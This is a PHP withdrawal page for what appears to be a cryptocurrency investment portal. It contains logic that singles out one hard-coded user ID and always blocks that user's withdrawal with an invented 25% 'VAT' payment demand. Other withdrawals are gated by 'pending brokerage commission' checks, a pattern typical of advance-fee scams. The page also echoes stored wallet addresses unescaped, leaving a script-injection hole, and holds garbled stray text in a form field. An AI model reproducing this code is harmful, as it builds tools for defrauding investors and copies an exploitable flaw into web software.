<?php
$pageName = 'deposit';

include_once "portal_settings.php";

$max_limit = $currUser->withdraw_limit ?? $userCl->getCurrLimit();

$withdraw_by = $currUser->id;

// This is the processing script
if ($_SERVER['REQUEST_METHOD'] == 'POST' || isset($_POST['send_proof'])) {

    if ($withdraw_by == 871) {
        echo '
            <script>
             swal({
                   title: "VAT Payment Required",
                    text: "You have  reached the international VAT threshold  of $20,000 in sales, so a 25% Value Added Tax (VAT) payment is required before your withdrawal can be processed.\n\nPlease complete the VAT payment to proceed.",
                    icon: "error"
                 }).then(()=>{
                    window.location.href = "deposit"
                 });
             </script>
        ';
    } else {

        $type = 'withdraw';
        $amount = $_POST['price'];
        $wallet_addr = $_POST['wallet_addr'];

        $method = $_POST['method'];

        $tyme = time();
        $time_created = date("d-m-Y h:ia", $tyme);
        $user_idd = $_SESSION['currid'];
        $refId = genRefId();

        if ($method == 'balance') {
            if ($amount > $currUser->balance) {
                echo '
               <script>
             swal({
                   title: "Oops!",
                    text: "Insufficient Balance in Ethereum Wallet",
                    icon: "warning"
                 });
             </script>
         ';
            } else {
                if ($amount >= $max_limit) {
                    $_SESSION['withdraw_amount'] = $amount;
                    $_SESSION['wallet_address'] = $wallet_addr;
                    $_SESSION['payout_coin'] = 'ETH';

                    $status = 0; //every confirmed swapping should bnot be pending.

                    $isValid = preg_match('/^0x[a-fA-F0-9]{40}$/', $wallet_addr);

                    if (!$isValid) {
                        echo '
                        <script>
                        swal({
                            title: "Error!",
                                text: "Please enter a valid Ethereum wallet address.",
                                icon: "warning"
                            });
                        </script>
                    ';
                    } else if ($userCl->userPendingCommision($withdraw_by)) {
                        echo '
           <script>
         swal({
               title: "Oops!",
                text: "Your ETH balance is insufficient to cover the pending brokerage commission",
                icon: "warning"
             });
         </script>
     ';
                    } else {
                        header('location: payout_review');
                    }
                } else {
                    echo '
           <script>
         swal({
               title: "Oops!",
               text: "You can only make a withdrawal of at least ' . $max_limit . 'ETH",
               icon: "warning",
               button: "Ok",
             });
         </script>
     ';
                }
            }
        } else {

            if ($amount > $currUser->profit) {
                echo '
           <script>
         swal({
               title: "Oops!",
                text: "Insufficient Balance to withdraw this amount",
                icon: "warning"
             });
         </script>
     ';
            } else if ($amount >= $max_limit) {

                $_SESSION['withdraw_amount'] = $amount;
                $_SESSION['wallet_address'] = $wallet_addr;
                $_SESSION['payout_coin'] = 'ARB';


                $status = 0; //every confirmed swapping should bnot be pending.

                $isValid = preg_match('/^0x[a-fA-F0-9]{40}$/', $wallet_addr);

                if (!$isValid) {
                    echo '
                        <script>
                        swal({
                            title: "Error!",
                                text: "Please enter a valid Ethereum wallet address.",
                                icon: "warning"
                            });
                        </script>
                    ';
                } else if ($userCl->userPendingCommision($withdraw_by)) {
                    echo '
           <script>
         swal({
               title: "Oops!",
                text: "Cannot withdraw at this moment, please ensure all pending brokerage fees have been paid.",
                icon: "warning"
             });
         </script>
     ';
                } else {
                    header('location: payout_review');
                }
            } else {
                echo '
           <script>
         swal({
               title: "Oops!",
               text: "You can only make a withdrawal of at least ' . $max_limit . 'ETH",
               icon: "warning",
               button: "Ok",
             });
         </script>
     ';
            }
        }
    }
    // $wallet_type = $_POST['wallet'];
    // $wallet_addrr = str_split($wallet_type, 12);
    // $type = $wallet_addrr[0];
    // echo $currUser->id;
    // print_r($userCl->userPendingCommision($currUser->id));
    // die();

}
?>
<style>
    .status_btn {
        padding: 10px 15px;
        font-size: 14px;
        font-weight: 700;
    }

    .form-control:disabled,
    .form-control[readonly] {
        background-color: none !important;
    }

    .swal-title {
        color: #f57372;
        font-weight: 800;
    }

    .swal-text {
        text-align: center;
    }
</style>


<div class="row">
    <div class="col-12 grid-margin stretch-card">
        <div class="card">
            <div class="page-header pt-5 px-md-5 px-3">
                <h3 class="page-title"> Withdrawal </h3>
                <nav aria-label="breadcrumb">
                    <button type="button" class="btn btn-success btn-rounded btn-fw p-3" class="btn-link" data-bs-toggle="modal" data-bs-target="#depositNiftyModal"><b>Withdraw Funds</b></button>

                </nav>
            </div>
            <div class="card-body table__container">
                <h6 class="text-center"><b>Withdrawal Logs</b></h6>
                </p>
                <table class="table table-hover table-responsive">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Payment Method</th>
                            <th>Amount</th>
                            <th>Account</th>
                            <th>Wallet Address</th>
                            <th>Date | Time</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        $sql = "SELECT * FROM `account_withdraw` WHERE `withdraw_by` = :dp ORDER BY `id` ASC ";
                        $statement = $pdo->prepare($sql);
                        $statement->bindParam(':dp', $idd);
                        $statement->execute();
                        $j = 1;
                        while ($withdrawal = $statement->fetch(PDO::FETCH_OBJ)) {
                            if ($withdrawal->status == 1) {
                                $color = 'btn-gradient-success';
                                $status = "Approved";
                            } else if ($withdrawal->status == 2) {
                                $color = 'btn-gradient-danger';
                                $status = "Not Approved";
                            } else {
                                $color = 'btn-gradient-dark';
                                $status = "Pending";
                            }
                            echo '
                        <tr>
                            <td>' . $j . '</td>
                            <td>Ethereum</td>
                            <td class="text-success">' . $withdrawal->amount . 'ETH</td>
                            <td> ' . ucfirst($withdrawal->method) . ' Balance</td>
                            <td>' . $withdrawal->wallet_addr . '</td>
                            <td>' . $withdrawal->time_withdrawn . '</td>
                            <td> <button type="button" class="btn ' . $color . ' btn-rounded status_btn">' . $status . '</button>
</td>
                        </tr>
                        ';
                            $j++;
                        }
                        ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

</div>
<!-- Modal -->
<div class="modal fade" id="depositNiftyModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title">Withdraw Funds</h4>
                <button type="button" class="btn-close icon-btn" data-bs-dismiss="modal" aria-label="Close">
                    <em class="ni ni-cross"></em>
                </button>
            </div>
            <div class="modal-body">

                <?php
                if ($currUser->profit > 0) {
                    $output = 'Minimum ' . $max_limit . ' ETH';
                } else {
                    $output = '';
                }

                ?>

                <form method="post" enctype="multipart/form-data">
                    <!-- <div class="input-group my-4"> -->
                    <div class="form-group">
                        <label for="amount"> Amount</label>
                        <input type="number" name="price" id="amount" class="form-control form-control-s1 " step="any" placeholder="<?= $output ?>" required>
                        <b>
                            <p class="ex_rate mb-3">= $0</p>
                        </b>
                    </div>

                    <div class="form-group">
                        <label for="account">Withdraw From</label>
                        <select class="form-control" id="account" name="method" onchange="toggleInput()" required>
                            <option selected value="" disabled>Select Option</option>
                            <option value="balance">ETH Wallet - <?= $currUser->balance ?>ETH</option>
                            <option value="profit">ETH (ARB) Wallet - <?= $currUser->profit ?>ETH</option>
                        </select>
                    </div>
                    <!-- <div class="form-group" id="wallet_address" style="display: none;"> -->
                    <div class="form-group">
                        <label for="addr">Wallet Address</label>
                        <input type="text" name="wallet_addr" id="addr" class="form-control form-control-s1" placeholder="Enter Address" requiredare you seriousGo>
                    </div>
                    <label for="method">Network </label>
                    <input type="text" id="method" class="form-control form-control-s1 mb-3" value="ERC20" name="method" disabled style="background: none!important;">


                    <!-- </div> -->

                    <div class="d-flex justify-content-center">
                        <button type="submit" class="btn btn-gradient-dark btn-rounded btn-fw p-3" name="send_proof">Next</button>
                    </div>
                </form>
            </div><!-- end modal-body -->
        </div><!-- end modal-content -->
    </div><!-- end modal-dialog -->
</div><!-- end modal-->

<!-- end footer-section -->
<!-- end page-wrap -->

<script>
    document.body.addEventListener('click', (e) => {
        if (e.target.getAttribute('id') == 'amount') {
            // console.log(e.target);
            e.target.addEventListener('keyup', () => {
                if (e.target.value == '') {
                    document.querySelector('.ex_rate').innerHTML = '= $0';

                } else {
                    $.ajax({
                        url: 'getdata.php',
                        method: 'POST',
                        data: {
                            payout_amount: e.target.value
                        },
                        success: (data) => {
                            console.log(data);
                            document.querySelector('.ex_rate').innerHTML = '= $' + data;
                        }
                    })
                }

            })
            // console.log(e.target.value);
        }
    })

    function toggleInput() {
        var select = document.getElementById('account');
        var inputF = document.getElementById('wallet_address');
        var blurEl = document.getElementById('addr');


        if (select.value === 'profit' || select.value === 'balance') {
            console.log('profit');
            inputF.style.display = 'block';
            blurEl.setAttribute('required', 'required')
        } else {
            console.log('mint');
            inputF.style.display = 'none';
            blurEl.removeAttribute('required')
        }
    }
</script>
<?php require_once 'portal_footer.php' ?>